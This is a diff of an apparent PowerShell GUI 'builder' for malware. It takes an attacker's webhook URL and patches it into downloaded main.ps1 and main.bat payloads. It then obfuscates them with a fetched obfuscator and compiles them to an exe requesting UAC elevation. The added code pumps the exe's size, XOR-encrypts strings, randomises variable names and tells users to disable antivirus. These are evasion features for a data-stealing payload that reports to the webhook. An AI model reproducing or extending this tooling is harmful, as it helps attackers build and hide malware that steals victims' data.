@@ -48,9 +48,9 @@ $wpf_code = @'
         </TextBox>
         <TextBox x:Name="OUTPUT_BOX" VerticalScrollBarVisibility="Auto" HorizontalAlignment="Left" Height="203" Margin="10,152,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="410" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.ColumnSpan="2"/>
         <Label Content="OUTPUT" HorizontalAlignment="Left" Height="28" Margin="152,119,0,0" VerticalAlignment="Top" Width="64" FontFamily="Impact" FontSize="18" Grid.Column="1"/>
-        <Button x:Name="Ps1_Button" Content="Build PS1" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="48" Margin="462,282,0,0" VerticalAlignment="Top" Width="346" FontFamily="Sitka Text Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.Column="1"/>
-        <Button x:Name="Bat_Button" Content="Build BAT" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="48" Margin="462,335,0,0" VerticalAlignment="Top" Width="346" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.Column="1"/>
-        <Button x:Name="Exe_Button" Content="Build Exe" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="48" Margin="462,388,0,0" VerticalAlignment="Top" Width="346" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.Column="1"/>
+        <Button x:Name="Ps1_Button" Content="Build PS1" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="48" Margin="462,282,0,0" VerticalAlignment="Top" Width="346" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.Column="1" Panel.ZIndex="1"/>
+        <Button x:Name="Bat_Button" Content="Build BAT" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="48" Margin="462,335,0,0" VerticalAlignment="Top" Width="346" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.Column="1" Panel.ZIndex="1"/>
+        <Button x:Name="Exe_Button" Content="Build Exe" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="48" Margin="462,388,0,0" VerticalAlignment="Top" Width="346" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.Column="1" Panel.ZIndex="1"/>
         <TextBox x:Name="WEBHOOK_BOX" VerticalScrollBarVisibility="Auto" HorizontalAlignment="Left" Height="53" Margin="10,391,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="348" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.ColumnSpan="2"/>
         <Label Content="ENTER WEBHOOK&#xD;&#xA;" HorizontalAlignment="Left" Height="28" Margin="121,358,0,0" VerticalAlignment="Top" Width="126" FontFamily="Impact" FontSize="18" Grid.ColumnSpan="2"/>
         <Button x:Name="CHECK_BUTTON" Grid.Column="1" Content="Check" HorizontalAlignment="Left" Height="53" Margin="363,391,0,0" VerticalAlignment="Top" Width="58" FontFamily="Impact" FontSize="18" Background="Black" Foreground="White"/>
@@ -58,6 +58,10 @@ $wpf_code = @'
     </Grid>
 </Window>
 '@
+
+function Invoke-SPEECH ($text) {
+    $var_OUTPUT_BOX.Text += $text + "`n"
+}
 
 function Invoke-UI {
     if (Invoke-CheckUpdate) {
@@ -87,7 +91,8 @@ function Invoke-UI {
     }
     Get-Variable var_* > $null
     
-    $var_ps1_button.add_Click({
+    $var_Ps1_Button.add_Click({
+        Write-Host "test"
         Invoke-PS1
     })
     
@@ -108,17 +113,18 @@ function Invoke-UI {
         try {
             $output = Invoke-WebRequest -Uri $webhook_box_text -UseBasicParsing -TimeoutSec 5
         } catch {
-            $var_OUTPUT_BOX.Text += "Webhook is invalid`n"
+            Invoke-SPEECH "Webhook is invalid"
             return
         }
         if ($output.StatusCode -eq 200) {
-            $var_OUTPUT_BOX.Text += "Webhook is valid`n"
+            Invoke-SPEECH "Webhook is valid"
         } else {
-            $var_OUTPUT_BOX.Text += "Webhook is invalid`n"
+            Invoke-SPEECH "Webhook is invalid"
         }
     })
 
-    $var_OUTPUT_BOX.Text += "Successfully Started`nNote: You might have to turn your anti virus off for building.`n"
+    Invoke-SPEECH "Successfully Started"
+    Invoke-SPEECH "Note: You might have to turn your anti virus off for building."
     $Null = $window.ShowDialog()
 }
 
@@ -134,7 +140,16 @@ function Invoke-PS1 {
     Invoke-WebRequest -Uri $download_url -OutFile "main.ps1" -UseBasicParsing
     #replace YOUR_WEBHOOK_HERE from main.ps1 with the new url
     (Get-Content "main.ps1").Replace('YOUR_WEBHOOK_HERE', $webhook_url) | Set-Content "main.ps1"
-    $var_OUTPUT_BOX.Text += "Successfully Built PS1`n"
+    Invoke-SPEECH "Successfully Built PS1"
+
+    $obfuscate_ps1 = [System.Windows.MessageBox]::Show("Do you want to obfuscate the code?", "Obfuscate?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
+    if ($obfuscate_ps1 -ne "Yes") {
+        return
+    }
+    #Invoke-Obfuscator -infile "main.ps1" -outfile "main.ps1" -iterations 12
+    Invoke-SPEECH "Obfuscation isn't supported for ps1 yet."
+    #Invoke-SPEECH "Obfuscated PS1"
+
 }
 
 function Invoke-BAT {
@@ -142,21 +157,21 @@ function Invoke-BAT {
     $download_url=$download_url+"bat"
     Invoke-WebRequest -Uri $download_url -OutFile "main.bat" -UseBasicParsing
     (Get-Content "main.bat").Replace('YOUR_WEBHOOK_HERE2', $webhook_url) | Set-Content "main.bat"
-    $var_OUTPUT_BOX.Text += "Successfully Built BAT`n"
+    Invoke-SPEECH "Successfully Built BAT"
     $obfuscate_box = [System.Windows.MessageBox]::Show("Do you want to obfuscate the code?", "Obfuscate?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
     if ($obfuscate_box -ne "Yes") {
         return
     }
-    $var_OUTPUT_BOX.Text += "Obfuscating BAT`n"
+    Invoke-SPEECH "Obfuscating BAT"
     (New-Object System.Net.WebClient).DownloadFile('https://github.com/KDot227/Somalifuscator/archive/refs/heads/main.zip', 'somalifuscator.zip')
     Expand-Archive -Path "somalifuscator.zip" -DestinationPath "somalifuscator"
     Remove-Item -Path "somalifuscator.zip"
-    $var_OUTPUT_BOX.Text += "Successfully Downloaded Somalifuscator`n"
+    Invoke-SPEECH "Successfully Downloaded Somalifuscator"
     $current_dir = Get-Location
     $somalifuscator_dir = $current_dir.ToString() + "\somalifuscator\Somalifuscator-main"
     #call setup.bat
     & $somalifuscator_dir\setup.bat $current_dir\main.bat ultimate
-    $var_OUTPUT_BOX.Text += "Successfully Obfuscated BAT`n"
+    Invoke-SPEECH "Successfully Obfuscated BAT"
 }
 
 function Invoke-EXE {
@@ -164,24 +179,30 @@ function Invoke-EXE {
     $download_url=$download_url+"bat"
     Invoke-WebRequest -Uri $download_url -OutFile "main.bat" -UseBasicParsing
     (Get-Content "main.bat").Replace('YOUR_WEBHOOK_HERE2', $webhook_url) | Set-Content "main.bat"
-    $var_OUTPUT_BOX.Text += "Successfully Built BAT`n"
-    $var_OUTPUT_BOX.Text += "Obfuscating BAT`n"
+    Invoke-SPEECH "Successfully Built BAT"
+    Invoke-SPEECH "Obfuscating BAT"
     (New-Object System.Net.WebClient).DownloadFile('https://github.com/KDot227/Somalifuscator/archive/refs/heads/main.zip', 'somalifuscator.zip')
     Expand-Archive -Path "somalifuscator.zip" -DestinationPath "somalifuscator"
     Remove-Item -Path "somalifuscator.zip"
-    $var_OUTPUT_BOX.Text += "Successfully Downloaded Somalifuscator`n"
+    Invoke-SPEECH "Successfully Downloaded Somalifuscator"
     $current_dir = Get-Location
     $somalifuscator_dir = $current_dir.ToString() + "\somalifuscator\Somalifuscator-main"
     Start-Process -FilePath "$somalifuscator_dir\setup.bat" -ArgumentList "$current_dir\main.bat ultimate" -Wait -NoNewWindow
-    $var_OUTPUT_BOX.Text += "Successfully Obfuscated BAT`n"
+    Invoke-SPEECH "Successfully Obfuscated BAT"
     Remove-Item -Path $current_dir\main.bat -Force
     Rename-Item -Path $current_dir\main.bat.ultimate.bat -NewName "main.bat" -Force
     Set-Location $somalifuscator_dir
     Start-Process -FilePath "$somalifuscator_dir\setup.bat" -ArgumentList "$current_dir\main.bat exe --uac" -Wait -NoNewWindow
     Move-Item -Path $somalifuscator_dir\main.exe -Destination $current_dir -Force
-    $var_OUTPUT_BOX.Text += "Successfully Built EXE`n"
+    Invoke-SPEECH "Successfully Built EXE"
     Remove-Item -Path $current_dir\main.bat -ErrorAction SilentlyContinue
     Remove-Item -Path $current_dir\main.bat.ultimate.bat -ErrorAction SilentlyContinue
+    $pump_box = [System.Windows.MessageBox]::Show("Do you want to pump the exe?", "Imagine?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
+    if ($pump_box -ne "Yes") {
+        return
+    }
+    Invoke-SPEECH "Pumping EXE"
+    Invoke-Pumper $current_dir\main.exe 7 $current_dir\main.exe 
 }
 
 function Invoke-AutoUpdate {
@@ -203,10 +224,51 @@ function Invoke-CheckUpdate {
     return $False
 }
 
+function Create-Var() {
+    $set = "abcdefghijkmnopqrstuvwxyz1234567890"
+    (1..(10 + (Get-Random -Maximum 7)) | %{ $set[(Get-Random -Minimum 5 -Maximum $set.Length)] } ) -join ''
+}
+
+function xorEnc {
+Param (
+    [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
+    [string] $string = $(Throw("Error !")),
+    [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
+    [string] $method = $(Throw("Error !")),
+    [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
+    [string] $key = $(Throw("Error !"))
+)
+$xorkey = [System.Text.Encoding]::UTF8.GetBytes($key)
+
+if ($method -eq "decrypt"){
+    $string = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($string))
+}
+
+$byteString = [System.Text.Encoding]::UTF8.GetBytes($string)
+$xordData = $(for ($i = 0; $i -lt $byteString.length; ) {
+    for ($j = 0; $j -lt $xorkey.length; $j++) {
+        $byteString[$i] -bxor $xorkey[$j]
+        $i++
+        if ($i -ge $byteString.Length) {
+            $j = $xorkey.length
+        }
+    }
+})
+
+if ($method -eq "encrypt") {
+    $xordData = [System.Convert]::ToBase64String($xordData)
+} else {
+    $xordData = [System.Text.Encoding]::UTF8.GetString($xordData)
+}
+
+return $xordData
+}
+
 try {
     $current_dir = Get-Location
     $somalifuscator_dir = $current_dir.ToString() + "\somalifuscator\Somalifuscator-main"
     Remove-Item -Path $somalifuscator_dir -Recurse -Force -ErrorAction SilentlyContinue
+    . "$PSScriptRoot\util\functions.ps1"
 } catch {
     $null
 }
